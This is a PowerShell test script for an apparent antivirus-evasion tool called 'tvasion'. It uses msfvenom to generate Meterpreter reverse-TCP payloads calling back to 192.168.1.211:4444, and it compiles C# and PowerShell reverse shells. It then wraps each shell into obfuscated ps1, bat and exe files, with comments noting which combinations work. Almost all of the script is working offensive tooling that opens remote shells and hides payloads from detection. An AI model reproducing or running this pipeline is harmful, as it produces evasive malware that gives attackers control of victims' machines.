#!/usr/bin/env pwsh

# TODO add host + port reverse shell variables for comfortable tests

# get current script path
function getScriptDirectory {
    $scriptInvocation = (Get-Variable MyInvocation -Scope 1).Value;
    return Split-Path $scriptInvocation.MyCommand.Path;
}
$__rootPath = getScriptDirectory;
$__workPath = Get-Location;

# check if compiler is available
if ((Get-Command "mcs" -ErrorAction SilentlyContinue) -eq $null) { 
    write-output "tvasion: compiler "mcs" not available, required for this action";
    write-output "tvasion: try: apt-get install -y mono-mcs";
    exit 1;
}

# check if metasploit is available
$meterpreter = $TRUE;
if ((Get-Command "msfconsole" -ErrorAction SilentlyContinue) -eq $null) { 
    write-output "tvasion: "msfconsole" not available, will not execute meterpreter tests";
    $meterpreter = $FALSE;
} else {

    # check if msfconsole / framework process    
    $msfconsole = Get-Process msfconsole -ErrorAction SilentlyContinue;
    if (-not $?) { 
        write-output "tvasion: launch msfconsole in seperate terminal please and try again";
        exit 1;
    }  
    
    # use bash to create msfvenom, powershell do not support pipes for binary data
    write-output "tvasion: generate metasploit test payloads. This will take some time..." 
    $msfvenomExe = "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format exe LHOST=192.168.1.211 LPORT=4444 > $($__rootPath)/out/Meterpreter_amd64.exe"
    bash -c "$($msfvenomExe)";
    $msfvenomPsh =  "msfvenom -p windows/x64/meterpreter_reverse_tcp --platform win -a x64 --format psh LHOST=192.168.1.211 LPORT=4444 > $($__rootPath)/out/Meterpreter_psh.ps1"
    bash -c "$($msfvenomPsh)";

}

# compile reverse shells
#mcs "$($__rootPath)/tests/ReverseShell.cs" -platform:x86 -out:"$($__rootPath)/out/ReverseShellc#_x86.exe"
write-output "tvasion: compile C# test payload. This will take some time..." 
mcs "$($__rootPath)/tests/ReverseShell.cs" -platform:x64 -out:"$($__rootPath)/out/ReverseShellc#_amd64.exe"

# copy powershell reverse shell in test used in ./out/
iex "cp $($__rootPath)/tests/ReverseShell.ps1 $($__rootPath)/out/ReverseShell.ps1"

##
## see below whats works, what not
##

write-output "output -t ps1:"
iex "$($__rootPath)/tvasion.ps1 -t ps1 $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1ps1_shell" # works
iex "$($__rootPath)/tvasion.ps1 -t ps1 $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeps1_shell" # doesn't work with all files, special binary required
if ($meterpreter) {
    iex "$($__rootPath)/tvasion.ps1 -t ps1 $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1ps1_meterpreterpsh" # works
    iex "$($__rootPath)/tvasion.ps1 -t ps1 $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeps1_meterpreter" # works, has DEP, ASLR warning output at the moment
    #iex "$($__rootPath)/tvasion.ps1 -t ps1 $($__rootPath)/out/Meterpreter_x86.exe -o $($__rootPath)/out/exeps1_meterpreterx86" # untested
}

write-output "output -t bat:"
iex "$($__rootPath)/tvasion.ps1 -t bat $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1bat_shell" # works
if ($meterpreter) {
    iex "$($__rootPath)/tvasion.ps1 -t bat $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exebat_meterpreter" # works maybe: requires small payload else powershell argument too long
    #iex "$($__rootPath)/tvasion.ps1 -t bat $($__rootPath)/out/Meterpreter_x86.exe-o $($__rootPath)/out/exebat_meterpreterx86" # untested
}

write-output "output -t exe:"
iex "$($__rootPath)/tvasion.ps1 -t exe $($__rootPath)/out/ReverseShell.ps1 -o $($__rootPath)/out/ps1exe_shell" # works
iex "$($__rootPath)/tvasion.ps1 -t exe $($__rootPath)/out/ReverseShellc#_amd64.exe -o $($__rootPath)/out/exeexe_shell" # doesn't work with all files, special binary required
if ($meterpreter) {
    iex "$($__rootPath)/tvasion.ps1 -t exe $($__rootPath)/out/Meterpreter_psh.ps1 -o $($__rootPath)/out/ps1exe_meterpreterpsh" # works maybe: requires small payload else too large shell execute argument
    iex "$($__rootPath)/tvasion.ps1 -t exe $($__rootPath)/out/Meterpreter_amd64.exe -o $($__rootPath)/out/exeexe_meterpreter" # works
    #iex "$($__rootPath)/tvasion.ps1 -t exe $($__rootPath)/out/Meterpreter_x86.exe -o $($__rootPath)/out/exeexe_meterpreterx86" # untested
}
write-output "tvasion: tests finished! see results in ./out"; 

